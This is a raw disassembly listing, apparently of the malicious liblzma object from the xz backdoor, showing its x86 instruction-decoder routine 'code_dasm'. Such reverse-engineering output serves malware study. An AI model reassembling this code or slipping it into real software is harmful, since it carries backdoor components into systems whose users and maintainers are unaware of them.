.text:0000000000000000 ; Input SHA256 : CBEEF92E67BF41CA9C015557D81F39ADABA67CA9FB3574139754999030B83537
.text:0000000000000000 ; Input MD5    : 212FFA0B24BB7D749532425A46764433
.text:0000000000000000 ; Input CRC32  : C780B1C6
.text:0000000000000000
.text:0000000000000000 ; File Name   : C:\Users\\Downloads\liblzma_la_crc64_fast.o\liblzma_la-crc64-fast.o
.text:0000000000000000 ; Format      : ELF64 for x86-64 (Relocatable)
.text:0000000000000000 ;
.text:0000000000000000
.text:0000000000000000                 .686p
.text:0000000000000000                 .mmx
.text:0000000000000000                 .model flat
.text:0000000000000000 .intel_syntax noprefix
.text:0000000000000000
.text:0000000000000000                 include liblzma_la-crc64-fast.o.inc
.text:0000000000000000
.text:0000000000000000 ; ===========================================================================
.text:0000000000000000
.text:0000000000000000 ; Segment type: Zero-length
.text:0000000000000000 ; Segment permissions: Read/Execute
.text:0000000000000000 _text           segment byte public 'CODE' use64
.text:0000000000000000 _text           ends
.text:0000000000000000
.text.x86_codd:0000000000000010 ; ===========================================================================
.text.x86_codd:0000000000000010
.text.x86_codd:0000000000000010 ; Segment type: Pure code
.text.x86_codd:0000000000000010 ; Segment permissions: Read/Execute
.text.x86_codd:0000000000000010 _text_x86_codd  segment para public 'CODE' use64
.text.x86_codd:0000000000000010                 assume cs:_text_x86_codd
.text.x86_codd:0000000000000010                 ;org 10h
.text.x86_codd:0000000000000010                 assume es:nothing, ss:nothing, ds:_text, fs:nothing, gs:nothing
.text.x86_codd:0000000000000010
.text.x86_codd:0000000000000010 ; =============== S U B R O U T I N E =======================================
.text.x86_codd:0000000000000010
.text.x86_codd:0000000000000010
.text.x86_codd:0000000000000010 ; __int64 __fastcall code_dasm(_DWORD *, unsigned __int64, unsigned __int64)
.text.x86_codd:0000000000000010                 public code_dasm
.text.x86_codd:0000000000000010 code_dasm       proc near               ; CODE XREF: sub_B00+49↓p
.text.x86_codd:0000000000000010                                         ; _Llzma_optimum_normal_0+60↓p ...
.text.x86_codd:0000000000000010
.text.x86_codd:0000000000000010 var_38          = qword ptr -38h
.text.x86_codd:0000000000000010 var_30          = qword ptr -30h
.text.x86_codd:0000000000000010 var_28          = qword ptr -28h
.text.x86_codd:0000000000000010 var_20          = qword ptr -20h
.text.x86_codd:0000000000000010
.text.x86_codd:0000000000000010                 endbr64
.text.x86_codd:0000000000000014                 push    r12
.text.x86_codd:0000000000000016                 mov     ecx, 2
.text.x86_codd:000000000000001B                 mov     r12, rsi
.text.x86_codd:000000000000001E                 mov     esi, 12h
.text.x86_codd:0000000000000023                 push    rbp
.text.x86_codd:0000000000000024                 mov     rbp, rdx
.text.x86_codd:0000000000000027                 mov     edx, 46h ; 'F'
.text.x86_codd:000000000000002C                 push    rbx
.text.x86_codd:000000000000002D                 mov     rbx, rdi
.text.x86_codd:0000000000000030                 xor     edi, edi
.text.x86_codd:0000000000000032                 sub     rsp, 20h
.text.x86_codd:0000000000000036                 call    apply_one_entry_ex ; PIC mode
.text.x86_codd:000000000000003B                 test    eax, eax
.text.x86_codd:000000000000003D                 jz      loc_5F6
.text.x86_codd:0000000000000043                 xor     eax, eax
.text.x86_codd:0000000000000045                 mov     ecx, 16h
.text.x86_codd:000000000000004A                 mov     rdi, rbx
.text.x86_codd:000000000000004D                 mov     rdx, r12
.text.x86_codd:0000000000000050                 rep stosd
.text.x86_codd:0000000000000052                 cmp     r12, rbp
.text.x86_codd:0000000000000055
.text.x86_codd:0000000000000055 loc_55:                                 ; CODE XREF: code_dasm+658↓j
.text.x86_codd:0000000000000055                 jnb     loc_A95
.text.x86_codd:000000000000005B                 movzx   eax, byte ptr [rdx]
.text.x86_codd:000000000000005E                 cmp     al, 67h ; 'g'
.text.x86_codd:0000000000000060                 ja      short loc_9D
.text.x86_codd:0000000000000062                 cmp     al, 2Dh ; '-'
.text.x86_codd:0000000000000064                 ja      short loc_78
.text.x86_codd:0000000000000066                 cmp     al, 0Fh
.text.x86_codd:0000000000000068                 jz      loc_138
.text.x86_codd:000000000000006E                 cmp     al, 26h ; '&'
.text.x86_codd:0000000000000070                 jnz     loc_181
.text.x86_codd:0000000000000076                 jmp     short loc_D7
.text.x86_codd:0000000000000078 ; ---------------------------------------------------------------------------
.text.x86_codd:0000000000000078
.text.x86_codd:0000000000000078 loc_78:                                 ; CODE XREF: code_dasm+54↑j
.text.x86_codd:0000000000000078                 mov     rsi, 0C0000000010101h
.text.x86_codd:0000000000000082                 lea     ecx, [rax-2Eh]
.text.x86_codd:0000000000000085                 bt      rsi, rcx
.text.x86_codd:0000000000000089                 jb      short loc_D7
.text.x86_codd:000000000000008B                 cmp     al, 67h ; 'g'
.text.x86_codd:000000000000008D                 jz      loc_11A
.text.x86_codd:0000000000000093                 cmp     al, 66h ; 'f'
.text.x86_codd:0000000000000095                 jnz     loc_16E
.text.x86_codd:000000000000009B                 jmp     short loc_EF
.text.x86_codd:000000000000009D ; ---------------------------------------------------------------------------
.text.x86_codd:000000000000009D
.text.x86_codd:000000000000009D loc_9D:                                 ; CODE XREF: code_dasm+50↑j
.text.x86_codd:000000000000009D                 cmp     al, 0F0h
.text.x86_codd:000000000000009F                 jz      short loc_BF
.text.x86_codd:00000000000000A1                 ja      short loc_B4
.text.x86_codd:00000000000000A3                 lea     ecx, [rax+3Ch]
.text.x86_codd:00000000000000A6                 cmp     cl, 1
.text.x86_codd:00000000000000A9                 jbe     loc_144
.text.x86_codd:00000000000000AF                 jmp     loc_181
.text.x86_codd:00000000000000B4 ; ---------------------------------------------------------------------------
.text.x86_codd:00000000000000B4
.text.x86_codd:00000000000000B4 loc_B4:                                 ; CODE XREF: code_dasm+91↑j
.text.x86_codd:00000000000000B4                 add     eax, 0Eh
.text.x86_codd:00000000000000B7                 cmp     al, 1
.text.x86_codd:00000000000000B9                 ja      loc_181
.text.x86_codd:00000000000000BF
.text.x86_codd:00000000000000BF loc_BF:                                 ; CODE XREF: code_dasm+8F↑j
.text.x86_codd:00000000000000BF                 mov     al, [rbx+10h]
.text.x86_codd:00000000000000C2                 test    al, 1
.text.x86_codd:00000000000000C4                 jnz     loc_5F6
.text.x86_codd:00000000000000CA                 or      eax, 1
.text.x86_codd:00000000000000CD                 mov     [rbx+10h], al
.text.x86_codd:00000000000000D0                 mov     al, [rdx]
.text.x86_codd:00000000000000D2                 mov     [rbx+14h], al
.text.x86_codd:00000000000000D5                 jmp     short loc_130
.text.x86_codd:00000000000000D7 ; ---------------------------------------------------------------------------
.text.x86_codd:00000000000000D7
.text.x86_codd:00000000000000D7 loc_D7:                                 ; CODE XREF: code_dasm+66↑j
.text.x86_codd:00000000000000D7                                         ; code_dasm+79↑j
.text.x86_codd:00000000000000D7                 mov     al, [rbx+10h]
.text.x86_codd:00000000000000DA                 test    al, 2
.text.x86_codd:00000000000000DC                 jnz     loc_5F6
.text.x86_codd:00000000000000E2                 or      eax, 2
.text.x86_codd:00000000000000E5                 mov     [rbx+10h], al
.text.x86_codd:00000000000000E8                 mov     al, [rdx]
.text.x86_codd:00000000000000EA                 mov     [rbx+15h], al
.text.x86_codd:00000000000000ED                 jmp     short loc_130
.text.x86_codd:00000000000000EF ; ---------------------------------------------------------------------------
.text.x86_codd:00000000000000EF
.text.x86_codd:00000000000000EF loc_EF:                                 ; CODE XREF: code_dasm+8B↑j
.text.x86_codd:00000000000000EF                 mov     al, [rbx+10h]
.text.x86_codd:00000000000000F2                 test    al, 4
.text.x86_codd:00000000000000F4                 jz      short loc_100
.text.x86_codd:00000000000000F6                 cmp     byte ptr [rbx+16h], 66h ; 'f'
.text.x86_codd:00000000000000FA                 jnz     loc_5F6
.text.x86_codd:0000000000000100
.text.x86_codd:0000000000000100 loc_100:                                ; CODE XREF: code_dasm+E4↑j
.text.x86_codd:0000000000000100                 test    al, 20h
.text.x86_codd:0000000000000102                 lea     rax, [rdx+1]
.text.x86_codd:0000000000000106                 jnz     loc_662
.text.x86_codd:000000000000010C                 or      byte ptr [rbx+10h], 4
.text.x86_codd:0000000000000110                 mov     dl, [rdx]
.text.x86_codd:0000000000000112                 mov     [rbx+16h], dl
.text.x86_codd:0000000000000115                 jmp     loc_662
.text.x86_codd:000000000000011A ; ---------------------------------------------------------------------------
.text.x86_codd:000000000000011A
.text.x86_codd:000000000000011A loc_11A:                                ; CODE XREF: code_dasm+7D↑j
.text.x86_codd:000000000000011A                 mov     al, [rbx+10h]
.text.x86_codd:000000000000011D                 test    al, 8
.text.x86_codd:000000000000011F                 jnz     loc_5F6
.text.x86_codd:0000000000000125                 or      eax, 8
.text.x86_codd:0000000000000128                 mov     [rbx+10h], al
.text.x86_codd:000000000000012B                 mov     al, [rdx]
.text.x86_codd:000000000000012D                 mov     [rbx+17h], al
.text.x86_codd:0000000000000130
.text.x86_codd:0000000000000130 loc_130:                                ; CODE XREF: code_dasm+C5↑j
.text.x86_codd:0000000000000130                                         ; code_dasm+DD↑j
.text.x86_codd:0000000000000130                 inc     rdx
.text.x86_codd:0000000000000133                 jmp     loc_665
.text.x86_codd:0000000000000138 ; ---------------------------------------------------------------------------
.text.x86_codd:0000000000000138
.text.x86_codd:0000000000000138 loc_138:                                ; CODE XREF: code_dasm+58↑j
.text.x86_codd:0000000000000138                 mov     dword ptr [rbx+28h], 0Fh
.text.x86_codd:000000000000013F                 inc     rdx
.text.x86_codd:0000000000000142                 jmp     short loc_1B9
.text.x86_codd:0000000000000144 ; ---------------------------------------------------------------------------
.text.x86_codd:0000000000000144
.text.x86_codd:0000000000000144 loc_144:                                ; CODE XREF: code_dasm+99↑j
.text.x86_codd:0000000000000144                 mov     cl, [rbx+10h]
.text.x86_codd:0000000000000147                 test    cl, 20h
.text.x86_codd:000000000000014A                 jnz     loc_5F6
.text.x86_codd:0000000000000150                 mov     [rbx+28h], eax
.text.x86_codd:0000000000000153                 mov     dil, [rdx]
.text.x86_codd:0000000000000156                 or      ecx, 10h
.text.x86_codd:0000000000000159                 lea     rsi, [rdx+1]
.text.x86_codd:000000000000015D                 mov     [rbx+10h], cl
.text.x86_codd:0000000000000160                 mov     [rbx+18h], dil
.text.x86_codd:0000000000000164                 cmp     rsi, rbp
.text.x86_codd:0000000000000167                 jb      short loc_18B
.text.x86_codd:0000000000000169                 jmp     loc_A95
.text.x86_codd:000000000000016E ; ---------------------------------------------------------------------------
.text.x86_codd:000000000000016E
.text.x86_codd:000000000000016E loc_16E:                                ; CODE XREF: code_dasm+85↑j
.text.x86_codd:000000000000016E                 and     eax, 0FFFFFFF0h
.text.x86_codd:0000000000000171                 cmp     al, 40h ; '@'
.text.x86_codd:0000000000000173                 jnz     short loc_181
.text.x86_codd:0000000000000175                 or      byte ptr [rbx+10h], 20h
.text.x86_codd:0000000000000179                 mov     al, [rdx]
.text.x86_codd:000000000000017B                 inc     rdx
.text.x86_codd:000000000000017E                 mov     [rbx+1Bh], al
.text.x86_codd:0000000000000181
.text.x86_codd:0000000000000181 loc_181:                                ; CODE XREF: code_dasm+60↑j
.text.x86_codd:0000000000000181                                         ; code_dasm+9F↑j ...
.text.x86_codd:0000000000000181                 cmp     rdx, rbp
.text.x86_codd:0000000000000184                 jb      short loc_201
.text.x86_codd:0000000000000186                 jmp     loc_A95
.text.x86_codd:000000000000018B ; ---------------------------------------------------------------------------
.text.x86_codd:000000000000018B
.text.x86_codd:000000000000018B loc_18B:                                ; CODE XREF: code_dasm+157↑j
.text.x86_codd:000000000000018B                 mov     r8b, [rdx+1]
.text.x86_codd:000000000000018F                 shl     eax, 8
.text.x86_codd:0000000000000192                 mov     byte ptr [rbx+1Bh], 40h ; '@'
.text.x86_codd:0000000000000196                 or      eax, 0Fh
.text.x86_codd:0000000000000199                 mov     [rbx+19h], r8b
.text.x86_codd:000000000000019D                 mov     [rbx+28h], eax
.text.x86_codd:00000000000001A0                 mov     cl, [rdx+1]
.text.x86_codd:00000000000001A3                 sar     cl, 7
.text.x86_codd:00000000000001A6                 and     ecx, 0FFFFFFFCh
.text.x86_codd:00000000000001A9                 add     ecx, 44h ; 'D'
.text.x86_codd:00000000000001AC                 mov     [rbx+1Bh], cl
.text.x86_codd:00000000000001AF                 cmp     dil, 0C5h
.text.x86_codd:00000000000001B3                 jnz     short loc_1C7
.text.x86_codd:00000000000001B5
.text.x86_codd:00000000000001B5 loc_1B5:                                ; CODE XREF: code_dasm+202↓j
.text.x86_codd:00000000000001B5                 lea     rdx, [rsi+1]
.text.x86_codd:00000000000001B9
.text.x86_codd:00000000000001B9 loc_1B9:                                ; CODE XREF: code_dasm+132↑j
.text.x86_codd:00000000000001B9                                         ; code_dasm+A80↓j
.text.x86_codd:00000000000001B9                 cmp     rdx, rbp
.text.x86_codd:00000000000001BC                 jb      loc_3BF
.text.x86_codd:00000000000001C2                 jmp     loc_A95
.text.x86_codd:00000000000001C7 ; ---------------------------------------------------------------------------
.text.x86_codd:00000000000001C7
.text.x86_codd:00000000000001C7 loc_1C7:                                ; CODE XREF: code_dasm+1A3↑j
.text.x86_codd:00000000000001C7                 cmp     dil, 0C4h
.text.x86_codd:00000000000001CB                 jnz     loc_5F6
.text.x86_codd:00000000000001D1                 mov     dil, [rdx+1]
.text.x86_codd:00000000000001D5                 mov     esi, edi
.text.x86_codd:00000000000001D7                 and     esi, 1Fh
.text.x86_codd:00000000000001DA                 and     dil, 40h
.text.x86_codd:00000000000001DE                 jnz     short loc_1E6
.text.x86_codd:00000000000001E0                 or      ecx, 2
.text.x86_codd:00000000000001E3                 mov     [rbx+1Bh], cl
.text.x86_codd:00000000000001E6
.text.x86_codd:00000000000001E6 loc_1E6:                                ; CODE XREF: code_dasm+1CE↑j
.text.x86_codd:00000000000001E6                 test    byte ptr [rdx+1], 20h
.text.x86_codd:00000000000001EA                 jnz     short loc_1F0
.text.x86_codd:00000000000001EC                 or      byte ptr [rbx+1Bh], 1
.text.x86_codd:00000000000001F0
.text.x86_codd:00000000000001F0 loc_1F0:                                ; CODE XREF: code_dasm+1DA↑j
.text.x86_codd:00000000000001F0                 dec     esi
.text.x86_codd:00000000000001F2                 cmp     sil, 2
.text.x86_codd:00000000000001F6                 jbe     loc_A40
.text.x86_codd:00000000000001FC                 jmp     loc_5F6
.text.x86_codd:0000000000000201 ; ---------------------------------------------------------------------------
.text.x86_codd:0000000000000201
.text.x86_codd:0000000000000201 loc_201:                                ; CODE XREF: code_dasm+174↑j
.text.x86_codd:0000000000000201                 mov     cl, [rdx]
.text.x86_codd:0000000000000203                 cmp     cl, 0Fh
.text.x86_codd:0000000000000206                 jnz     short loc_214
.text.x86_codd:0000000000000208                 mov     dword ptr [rbx+28h], 0Fh
.text.x86_codd:000000000000020F                 mov     rsi, rdx
.text.x86_codd:0000000000000212                 jmp     short loc_1B5
.text.x86_codd:0000000000000214 ; ---------------------------------------------------------------------------
.text.x86_codd:0000000000000214
.text.x86_codd:0000000000000214 loc_214:                                ; CODE XREF: code_dasm+1F6↑j
.text.x86_codd:0000000000000214                 movzx   eax, cl
.text.x86_codd:0000000000000217                 lea     rsi, byte_ADA0
.text.x86_codd:000000000000021E                 mov     r8d, ecx
.text.x86_codd:0000000000000221                 mov     r10d, eax
.text.x86_codd:0000000000000224                 and     r8d, 7
.text.x86_codd:0000000000000228                 shr     r10d, 3
.text.x86_codd:000000000000022C                 movzx   esi, byte ptr [rsi+r10]
.text.x86_codd:0000000000000231                 bt      esi, r8d
.text.x86_codd:0000000000000235                 jb      loc_5F6
.text.x86_codd:000000000000023B                 mov     rdi, 3030303030303030h
.text.x86_codd:0000000000000245                 mov     esi, ecx
.text.x86_codd:0000000000000247                 mov     r9, rdx
.text.x86_codd:000000000000024A                 mov     [rbx+28h], eax
.text.x86_codd:000000000000024D                 mov     [rsp+38h+var_38], rdi
.text.x86_codd:0000000000000251                 mov     edi, 3FFFC3Fh
.text.x86_codd:0000000000000256                 shr     sil, 6
.text.x86_codd:000000000000025A                 sub     r9, r12
.text.x86_codd:000000000000025D                 shl     rdi, 26h
.text.x86_codd:0000000000000261                 and     esi, 3
.text.x86_codd:0000000000000264                 mov     [rbx+50h], r9b
.text.x86_codd:0000000000000268                 mov     [rsp+38h+var_30], rdi
.text.x86_codd:000000000000026D                 mov     rdi, 0FFFF03000000000Bh
.text.x86_codd:0000000000000277                 mov     [rsp+38h+var_28], rdi
.text.x86_codd:000000000000027C                 mov     rdi, 0C00BFF000025C7h
.text.x86_codd:0000000000000286                 mov     [rsp+38h+var_20], rdi
.text.x86_codd:000000000000028B                 mov     rsi, [rsp+rsi*8+38h+var_38]
.text.x86_codd:000000000000028F                 shr     rsi, cl
.text.x86_codd:0000000000000292                 and     esi, 1
.text.x86_codd:0000000000000295                 jz      loc_326
.text.x86_codd:000000000000029B                 cmp     cl, 0F7h
.text.x86_codd:000000000000029E                 ja      loc_334
.text.x86_codd:00000000000002A4                 cmp     cl, 0C1h
.text.x86_codd:00000000000002A7                 ja      short loc_2C8
.text.x86_codd:00000000000002A9                 cmp     cl, 69h ; 'i'
.text.x86_codd:00000000000002AC                 ja      short loc_312
.text.x86_codd:00000000000002AE                 cmp     cl, 2Ch ; ','
.text.x86_codd:00000000000002B1                 ja      short loc_2F6
.text.x86_codd:00000000000002B3                 lea     edi, [rcx-5]
.text.x86_codd:00000000000002B6                 cmp     dil, 20h ; ' '
.text.x86_codd:00000000000002BA                 ja      short loc_334
.text.x86_codd:00000000000002BC                 mov     rdi, 2020202020h
.text.x86_codd:00000000000002C6                 jmp     short loc_303
.text.x86_codd:00000000000002C8 ; ---------------------------------------------------------------------------
.text.x86_codd:00000000000002C8
.text.x86_codd:00000000000002C8 loc_2C8:                                ; CODE XREF: code_dasm+297↑j
.text.x86_codd:00000000000002C8                 add     ecx, 3Eh ; '>'
.text.x86_codd:00000000000002CB                 mov     edi, 1
.text.x86_codd:00000000000002D0                 shl     rdi, cl
.text.x86_codd:00000000000002D3                 mov     rcx, rdi
.text.x86_codd:00000000000002D6                 mov     rdi, 2000C800000020h
.text.x86_codd:00000000000002E0                 test    rcx, rdi
.text.x86_codd:00000000000002E3                 jnz     short loc_32F
.text.x86_codd:00000000000002E5                 test    ecx, 101h
.text.x86_codd:00000000000002EB                 mov     ecx, 2
.text.x86_codd:00000000000002F0                 cmovnz  rsi, rcx
.text.x86_codd:00000000000002F4                 jmp     short loc_334
.text.x86_codd:00000000000002F6 ; ---------------------------------------------------------------------------
.text.x86_codd:00000000000002F6
.text.x86_codd:00000000000002F6 loc_2F6:                                ; CODE XREF: code_dasm+2A1↑j
.text.x86_codd:00000000000002F6                 mov     rdi, 1800000000010101h
.text.x86_codd:0000000000000300                 sub     ecx, 2Dh ; '-'
.text.x86_codd:0000000000000303
.text.x86_codd:0000000000000303 loc_303:                                ; CODE XREF: code_dasm+2B6↑j
.text.x86_codd:0000000000000303                                         ; code_dasm+312↓j
.text.x86_codd:0000000000000303                 bt      rdi, rcx
.text.x86_codd:0000000000000307                 mov     ecx, 4
.text.x86_codd:000000000000030C                 cmovb   rsi, rcx
.text.x86_codd:0000000000000310                 jmp     short loc_334
.text.x86_codd:0000000000000312 ; ---------------------------------------------------------------------------
.text.x86_codd:0000000000000312
.text.x86_codd:0000000000000312 loc_312:                                ; CODE XREF: code_dasm+29C↑j
.text.x86_codd:0000000000000312                 mov     rdi, 7F80010000000001h
.text.x86_codd:000000000000031C                 add     ecx, 7Fh
.text.x86_codd:000000000000031F                 cmp     cl, 3Eh ; '>'
.text.x86_codd:0000000000000322                 jbe     short loc_303
.text.x86_codd:0000000000000324                 jmp     short loc_334
.text.x86_codd:0000000000000326 ; ---------------------------------------------------------------------------
.text.x86_codd:0000000000000326
.text.x86_codd:0000000000000326 loc_326:                                ; CODE XREF: code_dasm+285↑j
.text.x86_codd:0000000000000326                 xor     r11d, r11d
.text.x86_codd:0000000000000329                 mov     [rbx+48h], r11
.text.x86_codd:000000000000032D                 jmp     short loc_33C
.text.x86_codd:000000000000032F ; ---------------------------------------------------------------------------
.text.x86_codd:000000000000032F
.text.x86_codd:000000000000032F loc_32F:                                ; CODE XREF: code_dasm+2D3↑j
.text.x86_codd:000000000000032F                 mov     esi, 4
.text.x86_codd:0000000000000334
.text.x86_codd:0000000000000334 loc_334:                                ; CODE XREF: code_dasm+28E↑j
.text.x86_codd:0000000000000334                                         ; code_dasm+2AA↑j ...
.text.x86_codd:0000000000000334                 or      byte ptr [rbx+11h], 8
.text.x86_codd:0000000000000338                 mov     [rbx+48h], rsi
.text.x86_codd:000000000000033C
.text.x86_codd:000000000000033C loc_33C:                                ; CODE XREF: code_dasm+31D↑j
.text.x86_codd:000000000000033C                 lea     rcx, byte_AD80
.text.x86_codd:0000000000000343                 movzx   esi, byte ptr [rcx+r10]
.text.x86_codd:0000000000000348                 mov     ecx, r8d
.text.x86_codd:000000000000034B                 sar     esi, cl
.text.x86_codd:000000000000034D                 and     sil, 1
.text.x86_codd:0000000000000351                 jnz     loc_8B5
.text.x86_codd:0000000000000357                 lea     ecx, [rax-0A0h]
.text.x86_codd:000000000000035D                 cmp     ecx, 3
.text.x86_codd:0000000000000360                 ja      short loc_36B
.text.x86_codd:0000000000000362                 or      byte ptr [rbx+11h], 5
.text.x86_codd:0000000000000366                 jmp     loc_64F
.text.x86_codd:000000000000036B ; ---------------------------------------------------------------------------
.text.x86_codd:000000000000036B
.text.x86_codd:000000000000036B loc_36B:                                ; CODE XREF: code_dasm+350↑j
.text.x86_codd:000000000000036B                 mov     cl, [rbx+11h]
.text.x86_codd:000000000000036E                 test    cl, 8
.text.x86_codd:0000000000000371                 jnz     short loc_37F
.text.x86_codd:0000000000000373                 mov     [rbx], r12
.text.x86_codd:0000000000000376                 lea     rdx, [r9+1]
.text.x86_codd:000000000000037A                 jmp     loc_4D1
.text.x86_codd:000000000000037F ; ---------------------------------------------------------------------------
.text.x86_codd:000000000000037F
.text.x86_codd:000000000000037F loc_37F:                                ; CODE XREF: code_dasm+361↑j
.text.x86_codd:000000000000037F                 test    byte ptr [rbx+10h], 20h
.text.x86_codd:0000000000000383                 jz      loc_66D
.text.x86_codd:0000000000000389                 test    byte ptr [rbx+1Bh], 8
.text.x86_codd:000000000000038D                 jz      loc_66D
.text.x86_codd:0000000000000393                 and     eax, 0FFFFFFF8h
.text.x86_codd:0000000000000396                 cmp     eax, 0B8h
.text.x86_codd:000000000000039B                 jnz     loc_66D
.text.x86_codd:00000000000003A1                 or      ecx, 10h
.text.x86_codd:00000000000003A4                 mov     qword ptr [rbx+48h], 8
.text.x86_codd:00000000000003AC                 mov     [rbx+11h], cl
.text.x86_codd:00000000000003AF                 mov     [rbx+20h], r8b
.text.x86_codd:00000000000003B3                 mov     dword ptr [rbx+28h], 0B8h
.text.x86_codd:00000000000003BA                 jmp     loc_66D
.text.x86_codd:00000000000003BF ; ---------------------------------------------------------------------------
.text.x86_codd:00000000000003BF
.text.x86_codd:00000000000003BF loc_3BF:                                ; CODE XREF: code_dasm+1AC↑j
.text.x86_codd:00000000000003BF                 mov     ecx, [rbx+28h]
.text.x86_codd:00000000000003C2                 shl     ecx, 8
.text.x86_codd:00000000000003C5                 mov     [rbx+28h], ecx
.text.x86_codd:00000000000003C8                 movzx   eax, byte ptr [rdx]
.text.x86_codd:00000000000003CB                 or      eax, ecx
.text.x86_codd:00000000000003CD                 mov     [rbx+28h], eax
.text.x86_codd:00000000000003D0                 mov     sil, [rdx]
.text.x86_codd:00000000000003D3                 mov     ecx, esi
.text.x86_codd:00000000000003D5                 and     ecx, 0FFFFFFFDh
.text.x86_codd:00000000000003D8                 cmp     cl, 38h ; '8'
.text.x86_codd:00000000000003DB                 jnz     short loc_3F8
.text.x86_codd:00000000000003DD                 test    byte ptr [rbx+10h], 10h
.text.x86_codd:00000000000003E1                 jnz     loc_5F6
.text.x86_codd:00000000000003E7                 inc     rdx
.text.x86_codd:00000000000003EA
.text.x86_codd:00000000000003EA loc_3EA:                                ; CODE XREF: code_dasm+A6F↓j
.text.x86_codd:00000000000003EA                 cmp     rdx, rbp
.text.x86_codd:00000000000003ED                 jb      loc_4EE
.text.x86_codd:00000000000003F3                 jmp     loc_A95
.text.x86_codd:00000000000003F8 ; ---------------------------------------------------------------------------
.text.x86_codd:00000000000003F8
.text.x86_codd:00000000000003F8 loc_3F8:                                ; CODE XREF: code_dasm+3CB↑j
.text.x86_codd:00000000000003F8                 mov     rcx, rsi
.text.x86_codd:00000000000003FB                 lea     rdi, byte_AD60
.text.x86_codd:0000000000000402                 shr     rcx, 3
.text.x86_codd:0000000000000406                 and     ecx, 1Fh
.text.x86_codd:0000000000000409                 movzx   edi, byte ptr [rdi+rcx]
.text.x86_codd:000000000000040D                 mov     ecx, esi
.text.x86_codd:000000000000040F                 and     ecx, 7
.text.x86_codd:0000000000000412                 sar     edi, cl
.text.x86_codd:0000000000000414                 and     dil, 1
.text.x86_codd:0000000000000418                 jz      loc_5F6
.text.x86_codd:000000000000041E                 cmp     byte ptr [rbx+14h], 0F3h
.text.x86_codd:0000000000000422                 jnz     short loc_42E
.text.x86_codd:0000000000000424                 cmp     sil, 1Eh
.text.x86_codd:0000000000000428                 jz      loc_A03
.text.x86_codd:000000000000042E
.text.x86_codd:000000000000042E loc_42E:                                ; CODE XREF: code_dasm+412↑j
.text.x86_codd:000000000000042E                 mov     rdi, rdx
.text.x86_codd:0000000000000431                 mov     esi, eax
.text.x86_codd:0000000000000433                 sub     rdi, r12
.text.x86_codd:0000000000000436                 mov     [rbx+50h], dil
.text.x86_codd:000000000000043A                 test    byte ptr [rbx+10h], 10h
.text.x86_codd:000000000000043E                 jz      short loc_443
.text.x86_codd:0000000000000440                 movzx   esi, ax
.text.x86_codd:0000000000000443
.text.x86_codd:0000000000000443 loc_443:                                ; CODE XREF: code_dasm+42E↑j
.text.x86_codd:0000000000000443                 mov     ecx, esi
.text.x86_codd:0000000000000445                 and     ecx, 0F0h
.text.x86_codd:000000000000044B                 cmp     ecx, 80h
.text.x86_codd:0000000000000451                 jz      short loc_48B
.text.x86_codd:0000000000000453                 movzx   ecx, sil
.text.x86_codd:0000000000000457                 cmp     sil, 73h ; 's'
.text.x86_codd:000000000000045B                 ja      short loc_464
.text.x86_codd:000000000000045D                 cmp     ecx, 6Fh ; 'o'
.text.x86_codd:0000000000000460                 jbe     short loc_482
.text.x86_codd:0000000000000462                 jmp     short loc_492
.text.x86_codd:0000000000000464 ; ---------------------------------------------------------------------------
.text.x86_codd:0000000000000464
.text.x86_codd:0000000000000464 loc_464:                                ; CODE XREF: code_dasm+44B↑j
.text.x86_codd:0000000000000464                 sub     ecx, 0A4h
.text.x86_codd:000000000000046A                 cmp     ecx, 22h ; '"'
.text.x86_codd:000000000000046D                 ja      short loc_482
.text.x86_codd:000000000000046F                 mov     r8, 740400101h
.text.x86_codd:0000000000000479                 shr     r8, cl
.text.x86_codd:000000000000047C                 and     r8b, 1
.text.x86_codd:0000000000000480                 jnz     short loc_492
.text.x86_codd:0000000000000482
.text.x86_codd:0000000000000482 loc_482:                                ; CODE XREF: code_dasm+450↑j
.text.x86_codd:0000000000000482                                         ; code_dasm+45D↑j
.text.x86_codd:0000000000000482                 xor     r9d, r9d
.text.x86_codd:0000000000000485                 mov     [rbx+48h], r9
.text.x86_codd:0000000000000489                 jmp     short loc_49F
.text.x86_codd:000000000000048B ; ---------------------------------------------------------------------------
.text.x86_codd:000000000000048B
.text.x86_codd:000000000000048B loc_48B:                                ; CODE XREF: code_dasm+441↑j
.text.x86_codd:000000000000048B                 mov     ecx, 4
.text.x86_codd:0000000000000490                 jmp     short loc_497
.text.x86_codd:0000000000000492 ; ---------------------------------------------------------------------------
.text.x86_codd:0000000000000492
.text.x86_codd:0000000000000492 loc_492:                                ; CODE XREF: code_dasm+452↑j
.text.x86_codd:0000000000000492                                         ; code_dasm+470↑j
.text.x86_codd:0000000000000492                 mov     ecx, 1
.text.x86_codd:0000000000000497
.text.x86_codd:0000000000000497 loc_497:                                ; CODE XREF: code_dasm+480↑j
.text.x86_codd:0000000000000497                 or      byte ptr [rbx+11h], 8
.text.x86_codd:000000000000049B                 mov     [rbx+48h], rcx
.text.x86_codd:000000000000049F
.text.x86_codd:000000000000049F loc_49F:                                ; CODE XREF: code_dasm+479↑j
.text.x86_codd:000000000000049F                 mov     ecx, esi
.text.x86_codd:00000000000004A1                 lea     r8, byte_AD40
.text.x86_codd:00000000000004A8                 and     esi, 7
.text.x86_codd:00000000000004AB                 shr     ecx, 3
.text.x86_codd:00000000000004AE                 and     ecx, 1Fh
.text.x86_codd:00000000000004B1                 movzx   r8d, byte ptr [r8+rcx]
.text.x86_codd:00000000000004B6                 bt      r8d, esi
.text.x86_codd:00000000000004BA                 jb      loc_8B5
.text.x86_codd:00000000000004C0                 test    byte ptr [rbx+11h], 8
.text.x86_codd:00000000000004C4                 jnz     loc_66D
.text.x86_codd:00000000000004CA                 mov     [rbx], r12
.text.x86_codd:00000000000004CD                 lea     rdx, [rdi+1]
.text.x86_codd:00000000000004D1
.text.x86_codd:00000000000004D1 loc_4D1:                                ; CODE XREF: code_dasm+36A↑j
.text.x86_codd:00000000000004D1                                         ; code_dasm+63A↓j ...
.text.x86_codd:00000000000004D1                 mov     [rbx+8], rdx
.text.x86_codd:00000000000004D5                 test    rdx, rdx
.text.x86_codd:00000000000004D8                 jz      loc_5F6
.text.x86_codd:00000000000004DE
.text.x86_codd:00000000000004DE loc_4DE:                                ; CODE XREF: code_dasm+7D4↓j
.text.x86_codd:00000000000004DE                 sub     eax, 0FFFFFF80h
.text.x86_codd:00000000000004E1
.text.x86_codd:00000000000004E1 loc_4E1:                                ; CODE XREF: code_dasm+A2B↓j
.text.x86_codd:00000000000004E1                 mov     [rbx+28h], eax
.text.x86_codd:00000000000004E4                 mov     eax, 1
